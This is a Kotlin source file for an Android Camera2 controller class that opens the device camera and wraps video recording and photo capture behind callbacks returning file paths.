package com.hc.calling.commands.shadow.vision.camera

import android.content.Context
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.os.Handler
import android.view.Surface
import com.hc.calling.commands.shadow.util.Photographer
import com.hc.calling.commands.shadow.util.VideoRecoder
import com.hc.calling.commands.shadow.vision.Recorder

/**
 * Created by ChanHong on 2019/4/10
 *
 */
class Camera2Control(
    context: Context
) :
    Recorder(context) {
    private var mCameraDevice: CameraDevice? = null
    private var mSurfaces: MutableList<Surface>? = null
    private var mHandler: Handler? = null
    private var mCaptureRequestBuilder: CaptureRequest.Builder? = null
    private var mImageReader: ImageReader? = null
    private var mCaptureSession: CameraCaptureSession? = null
    private var photographer: Photographer? = null

    override fun record(completed: (filePath: String) -> Unit) {
        super.record()
        VideoRecoder(mFilePath!!).requestRecord(mCameraDevice!!, mSurfaces!!, mHandler!!) {
            completed(it)
        }
    }

    override fun takePhoto(completed: (filePath: String) -> Unit) {
        super.takePhoto(completed)
        Photographer.capture(
            mContext,
            mCaptureRequestBuilder!!,
            mCaptureSession!!,
            mImageReader!!,
            mCameraDevice!!,
            mHandler!!
        ) {
            completed(it)
        }
    }

    override fun initMediaRecorder(completed: () -> Unit) {
        photographer = Photographer(mContext) { builder, session, device, imageReader, surfaces, handler ->
            mCameraDevice = device
            mSurfaces = surfaces
            mHandler = handler
            mCaptureRequestBuilder = builder
            mImageReader = imageReader
            mCaptureSession = session
            completed()
        }.openCamera(mCamera!!)
    }

}